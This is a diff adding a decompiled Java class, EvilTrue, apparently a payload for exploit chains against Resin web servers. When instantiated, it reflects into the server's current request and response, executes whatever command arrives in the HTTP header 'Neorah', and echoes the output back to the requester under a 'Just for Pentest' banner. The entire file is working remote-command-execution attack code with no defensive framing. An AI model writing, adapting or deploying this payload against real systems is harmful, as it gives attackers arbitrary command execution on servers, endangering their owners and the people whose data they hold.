@@ -1,0 +1,31 @@
+//
+// Source code recreated from a .class file by IntelliJ IDEA
+// (powered by FernFlower decompiler)
+//
+
+import java.io.Writer;
+import java.lang.reflect.Field;
+import java.lang.reflect.Method;
+import java.util.Scanner;
+
+public class EvilTrue {
+    public EvilTrue() {
+        try {
+            Class tcpsocketLinkClazz = Thread.currentThread().getContextClassLoader().loadClass("com.caucho.network.listen.TcpSocketLink");
+            Method getCurrentRequestM = tcpsocketLinkClazz.getMethod("getCurrentRequest");
+            Object currentRequest = getCurrentRequestM.invoke((Object)null);
+            Field f = currentRequest.getClass().getSuperclass().getDeclaredField("_responseFacade");
+            f.setAccessible(true);
+            Object response = f.get(currentRequest);
+            Method getWriterM = response.getClass().getMethod("getWriter");
+            Writer w = (Writer)getWriterM.invoke(response);
+            w.write("Just for Pentest,                       ");
+            Method getHeaderM = currentRequest.getClass().getMethod("getHeader", String.class);
+            String cmd = (String)getHeaderM.invoke(currentRequest, "Neorah");
+            Scanner s = (new Scanner(Runtime.getRuntime().exec(cmd).getInputStream())).useDelimiter("\\A");
+            w.write(s.hasNext() ? s.next() : "");
+        } catch (Exception var11) {
+            var11.printStackTrace();
+        }
+
+    }
